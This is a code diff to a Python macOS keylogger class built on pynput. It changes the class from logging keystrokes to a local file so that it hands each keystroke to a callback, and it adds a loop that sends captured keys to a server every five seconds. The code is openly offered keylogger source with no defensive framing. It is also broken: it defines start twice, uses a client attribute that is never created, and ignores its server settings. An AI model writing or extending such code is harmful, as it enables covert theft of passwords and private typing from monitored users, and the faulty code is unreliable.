@@ -1,19 +1,22 @@
-from pynput import keyboard
+from pynput.keyboard import Listener
 from typing import List
 from .interfaces import IKeyLogger
 from datetime import datetime
 import threading
 import logging
 from ..utils.permissions import PermissionChecker, MacPermissionError
+import time
 
 class MacKeyLogger(IKeyLogger):
-    def __init__(self, log_path: str = "keylog.txt"):
+    def __init__(self, server_host='localhost', server_port=5002):
         self.key_buffer: List[str] = []
         self.buffer_lock = threading.Lock()
         self.running = False
         self.listener = None
         self.current_minute = ""
-        self.log_path = log_path
+        self.log_path = "keylog.txt"
+        self.callback = None
+        self.logged_keys = []
         
         # Setup logging
         self.logger = logging.getLogger(__name__)
@@ -28,6 +31,7 @@ class MacKeyLogger(IKeyLogger):
         except Exception as e:
             self.logger.error(f"Unexpected error during initialization: {e}")
             raise
+
 
     def _check_permissions(self) -> None:
         """Verify all required permissions before starting"""
@@ -53,7 +57,7 @@ class MacKeyLogger(IKeyLogger):
             self._check_permissions()
             
             self.running = True
-            self.listener = keyboard.Listener(
+            self.listener = Listener(
                 on_press=self._on_press,
                 suppress=False  # Changed this to False
             )
@@ -94,58 +98,21 @@ class MacKeyLogger(IKeyLogger):
             self.logger.error(f"Error retrieving logged keys: {e}")
             return []
 
-    def _on_press(self, key) -> bool:
-        """Handle key press events with error handling"""
-        if not self.running:
-            return False
-
+    def _on_press(self, key):
         try:
-            with self.buffer_lock:
-                now = datetime.now()
-                minute = now.strftime("%Y-%m-%d %H:%M")
+            # Convert the key to a string representation
+            key_str = str(key)
+            if hasattr(key, 'char'):
+                key_str = key.char
+            elif hasattr(key, 'name'):
+                key_str = key.name
                 
-                if self.current_minute != minute:
-                    self.current_minute = minute
-                    self.key_buffer.append(f"\n[{minute}] ")
-
-                if hasattr(key, 'char') and key.char:
-                    self.key_buffer.append(key.char)
-                else:
-                    # Enhanced key mapping with cleaner output
-                    key_mapping = {
-                        keyboard.Key.space: ' ',
-                        keyboard.Key.enter: '\n',
-                        keyboard.Key.tab: '\t',
-                        keyboard.Key.backspace: '[←]',
-                        keyboard.Key.delete: '[DEL]',
-                        keyboard.Key.cmd: '',  # Hide CMD key
-                        keyboard.Key.shift: '',  # Hide SHIFT key
-                        keyboard.Key.shift_r: '',  # Hide right SHIFT key
-                        keyboard.Key.shift_l: '',  # Hide left SHIFT key
-                        keyboard.Key.ctrl: '',  # Hide CTRL key
-                        keyboard.Key.ctrl_r: '',  # Hide right CTRL key
-                        keyboard.Key.ctrl_l: '',  # Hide left CTRL key
-                        keyboard.Key.alt: '',  # Hide ALT/OPT key
-                        keyboard.Key.alt_r: '',  # Hide right ALT/OPT key
-                        keyboard.Key.alt_l: '',  # Hide left ALT/OPT key
-                        keyboard.Key.esc: '',  # Hide ESC key
-                        keyboard.Key.caps_lock: '[CAPS]',
-                        keyboard.Key.right: '[→]',
-                        keyboard.Key.left: '[←]',
-                        keyboard.Key.up: '[↑]',
-                        keyboard.Key.down: '[↓]'
-                    }
-                    
-                    # Get mapped key or empty string if not in mapping
-                    mapped_key = key_mapping.get(key, '')
-                    if mapped_key:  # Only append if not empty
-                        self.key_buffer.append(mapped_key)
-                
-                return True
+            # Send the key string to the callback
+            if self.callback:
+                self.callback(key_str)
                 
         except Exception as e:
-            self.logger.error(f"Error processing key event: {e}")
-            return True
+            self.logger.error(f"Error processing key: {e}")
 
     def __del__(self):
         """Ensure clean shutdown"""
@@ -153,4 +120,45 @@ class MacKeyLogger(IKeyLogger):
             if self.running:
                 self.stop_logging()
         except Exception as e:
-            self.logger.error(f"Error during cleanup: {e}") 
+            self.logger.error(f"Error during cleanup: {e}")
+
+    def start(self, callback=None):
+        """Start the keylogger with optional callback"""
+        try:
+            self.callback = callback
+            self.running = True
+            self.listener = Listener(on_press=self._on_press)
+            self.listener.start()
+            self.logger.info("Keylogger started successfully")
+        except Exception as e:
+            self.logger.error(f"Error starting keylogger: {e}")
+            self.running = False
+            raise
+
+    def stop(self):
+        self.running = False
+        if self.listener:
+            self.listener.stop()
+            self.listener = None
+
+    def start(self, callback=None):
+        """
+        Start the keylogger with optional callback
+        """
+        try:
+            self.callback = callback
+            self.running = True
+            self.listener = Listener(on_press=self._on_press)
+            self.listener.start()
+            
+            if self.client.connect():
+                # Main logging loop
+                while self.running:
+                    logs = self.get_logged_keys()
+                    if logs:
+                        self.client.send_logs(''.join(logs))
+                    time.sleep(5)
+        except Exception as e:
+            self.logger.error(f"Error starting keylogger: {e}")
+            self.running = False
+            raise
